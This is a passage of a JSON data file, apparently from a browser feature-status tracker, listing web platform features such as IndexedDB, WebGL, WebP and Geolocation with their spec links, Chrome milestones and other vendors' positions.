        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/quota-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 14
        },
        "owners": [
          "kinuko@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 14,
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie/quotamanagementapi",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This API can be used to check how much quota an app/origin is using.",
    "id": 6218562888794112,
    "resources": {}
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2018-04-25 05:44:21.006320",
      "by": "Patket@microsoft.com"
    },
    "name": "a[download] attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://whatwg.org/html#downloading-resources",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/20#HTML",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 14
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 14,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When used on an <a>, this attribute signifies that the resource it points to should be downloaded by the browser rather than navigating to it. ",
    "id": 6473924464345088,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#attr-download"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-22 20:11:07.749680",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "File System API (Chromium)",
    "comments": "Mozilla submitted a different API proposal to WebApps WG (http://w3c.github.io/filesystem-api/). Discussions ongoing http://www.w3.org/2013/11/11-webapps-minutes.html#item04",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://dev.w3.org/2009/dap/file-system/file-dir-sys.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 13
        },
        "owners": [
          "ericu@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 13,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "With the FileSystem API, a web app can create, read, navigate, and write to a sandboxed section of the user's local file system.",
    "id": 5452478162141184,
    "resources": {
      "docs": [
        "http://www.html5rocks.com/en/tutorials/file/filesystem/",
        "https://developer.mozilla.org/en-US/docs/Web/API/FileSystem"
      ],
      "samples": [
        "http://www.htmlfivewow.com/demos/terminal/terminal.html"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:42.692530",
      "by": "ericbidelman@google.com"
    },
    "name": "Navigation Timing API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/NavigationTiming/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 13
        },
        "owners": [
          "simonjames@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 13,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows web applications to access timing information related to navigation and elements.",
    "id": 5584144679567360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Navigation_timing"
      ],
      "samples": [
        "http://simpl.info/navigationtiming/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:36.847560",
      "by": "ericbidelman@google.com"
    },
    "name": "Typed Arrays",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.khronos.org/registry/typedarray/specs/latest/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 13
        },
        "owners": [
          "kbr@chromium.org",
          "dslomov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 13,
        "flag": false,
        "android": 13,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/br212485",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Buffers for holding binary data and working with WebGL & Audio API: ArrayBuffer, Float32Array , Int16Array, Uint8Array, etc.)",
    "id": 5135818813341696,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 05:42:25.317430",
      "by": "Patket@microsoft.com"
    },
    "name": "Web SQL Database",
    "comments": "Demo: simpl.info/websql",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.w3.org/TR/webdatabase/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 13
        },
        "owners": [
          "michaeln@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 13,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 10,
        "desktop": 10
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/websqldatabase",
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "API exposing an SQLite database ",
    "id": 6330987952734208,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-25 05:41:35.913300",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "<details>/<summary>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#the-details-element",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=591737",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 12
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 12,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/6261266-details-summary-elements",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Interactive widget to show/hide content.",
    "id": 5348024557502464,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/details",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/summary"
      ],
      "samples": [
        "http://simpl.info/details/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:26.853460",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove support for -webkit-line-box-contain",
    "tags": [
      "css",
      "leading",
      "glyphs",
      "text",
      "layout",
      "line-box-contain"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.w3.org/TR/2001/WD-css3-box-20010726/#the-line-box-contain",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 12
        },
        "owners": [
          "wkorman@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 12,
        "ios": 12,
        "blink_components": [
          "Blink"
        ],
        "desktop": 12,
        "flag": false,
        "android": 12,
        "bug": "http://crbug.com/522215",
        "intervention": false
      },
      "opera": {
        "android": 0,
        "desktop": 0
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Feature is not part of formal spec and will be subsumed by upcoming css-line-grid spec in discussion. Only supported by Safari among major browsers. Utilization is low.",
    "id": 4521139636273152,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/www-style/2014Dec/0288.html"
      ],
      "samples": [
        "http://jsfiddle.net/6u7Qa/1/"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:01:05.272390",
      "by": "jsbell@chromium.org"
    },
    "first_of_milestone": true,
    "name": "IndexedDB",
    "tags": [
      "indexed db",
      "indexeddb",
      "idb",
      "database"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://dvcs.w3.org/hg/IndexedDB/raw-file/tip/Overview.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 11
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 11,
        "flag": false,
        "bug": "http://crbug.com/158629",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An asynchronous client-side storage API offering fast access to large amounts of structured data",
    "id": 6507459568992256,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-25 05:38:07.857270",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "Form validation",
    "comments": "Safari has constraint validation API, but no interactive form validation.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#constraints",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 10
        },
        "owners": [
          "keishi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 10,
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Constraint validation API and interactive form validation UI.\r\n",
    "id": 6091813840486400,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms/Data_form_validation"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-25 05:36:11.800720",
      "by": "Patket@microsoft.com"
    },
    "name": "Runtime error reporting: ErrorEvent.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/webappapis.html#runtime-script-errors",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers.onerror",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 10
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 18,
        "blink_components": [
          "Blink"
        ],
        "desktop": 10,
        "flag": false,
        "android": 18,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/runtimeerrorreportingerrorevent",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Unhandled exceptions trigger the 'window.onerror' callback (or 'self.onerror' inside Workers) for centralized handling.",
    "id": 6416612420747264,
    "resources": {}
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:29:08.943850",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "FileWriter",
    "comments": "Work on the spec has been discontinued in April 2014 http://www.w3.org/TR/2014/NOTE-file-writer-api-20140424/",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 9
        },
        "owners": [
          "ericu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 9,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Synchronous API added in Chrome 9 for Workers",
    "id": 5963201313243136,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:09.809290",
      "by": "ericbidelman@google.com"
    },
    "name": "WebGL  (Canvas 3D)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.khronos.org/registry/webgl/specs/latest/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/WebGL",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 9
        },
        "owners": [
          "vangelis@chromium.org",
          "kbr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 9,
        "flag": false,
        "android": 30,
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://techcrunch.com/2013/06/26/microsoft-confirms-webgl-support-for-internet-explorer-11/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://support.apple.com/kb/PH11926",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "3D rendering via the <canvas> element. ",
    "id": 6049512976023552,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/WebGL"
      ],
      "samples": [
        "http://simpl.info/webgl/"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-06-22 04:00:52.687565",
      "by": "myakura.web@gmail.com"
    },
    "name": "WebP image format support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://developers.google.com/speed/webp/docs/riff_container",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 9
        },
        "owners": [
          "skonig@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 9,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/webpimageformat/?q=webp%20image%20format",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WebP is an image format that provides lossless and lossy compression for images on the web. WebP lossless images are 26% smaller in size compared to PNGs; lossy is 35% smaller than JPEG.",
    "id": 6471725441089536,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:29.283810",
      "by": "ericbidelman@google.com"
    },
    "name": "matchMedia",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#widl-Window-matchMedia-MediaQueryList-DOMString-query",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 9
        },
        "owners": [
          "luiz@webkit"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 9,
        "flag": false,
        "bug": "http://wkbug.com/37205",
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "API for testing if a given media query will apply.",
    "id": 4677872220372992,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Testing_media_queries"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:47.531200",
      "by": "ericbidelman@google.com"
    },
    "name": "spellcheck attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#spelling-and-grammar-checking",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.w3schools.com/tags/att_global_spellcheck.asp",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 9
        },
        "owners": [
          "miguelg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 9,
        "flag": false,
        "android": 47,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://www.w3schools.com/tags/att_global_spellcheck.asp",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://www.w3schools.com/tags/att_global_spellcheck.asp",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Allows content editable elements to be spell checked",
    "id": 5653714173952000,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-25 05:29:59.416320",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "Device Orientation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/geo/api/spec-source-orientation.html",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 7
        },
        "owners": [
          "timvolodine@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 7,
        "flag": false,
        "bug": "http://crbug.com/44654",
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Provides access to device's physical orientation",
    "id": 5874690627207168,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Detecting_device_orientation"
      ],
      "samples": [
        "http://simpl.info/deviceorientation/"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:28:37.393410",
      "by": "ericbidelman@google.com"
    },
    "name": "FileReader",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/2006/webapi/FileAPI/#dfn-filereader",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 7
        },
        "owners": [
          "jianli@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 7,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 11
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The FileReader object lets web applications asynchronously read the contents of files (or raw data buffers) stored on the user's computer, using File or Blob objects to specify the file or data to read.",
    "id": 5171003185430528,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FileReader"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:36.973820",
      "by": "ericbidelman@google.com"
    },
    "name": "HTTP/2 (SPDY)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://http2.github.io/http2-spec",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 7
        },
        "owners": [
          "willchan@chromium.org",
          "fenix@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 7,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://www.extremetech.com/computing/159779-windows-8-1-and-internet-explorer-11-will-support-webgl-spdy-but-no-webrtc",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://live.arstechnica.com/apples-wwdc-2014-keynote/images/IMG_9669.JPG",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A fast, open protocol for transporting web content.",
    "id": 5152586365665280,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:11.674040",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Application Cache",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://whatwg.org/html/#applicationcache",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 6
        },
        "owners": [
          "michaeln@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 6,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 11,
        "desktop": 10
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Negative",
          "val": 5
        }
      }
    },
    "summary": "Enables web pages to work without the user being connected to the internet",
    "id": 6192449487634432,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:39.052080",
      "by": "ericbidelman@google.com"
    },
    "name": "EventSource",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://whatwg.org/html#server-sent-events",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 6
        },
        "owners": [
          "?@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 6,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 10,
        "desktop": 9
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Also called Server-sent Events, these are push notifications from the server received as DOM events.",
    "id": 5311740673785856,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/EventSource"
      ],
      "samples": [
        "http://simpl.info/eventsource/"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-11-08 03:19:33.700750",
      "by": "jmedley@google.com"
    },
    "first_of_milestone": true,
    "name": "Geolocation",
    "comments": "Intent to Change - Geolocation maximum age\r\n\r\nhttp://crbug.com/769231",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/geolocation-API/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
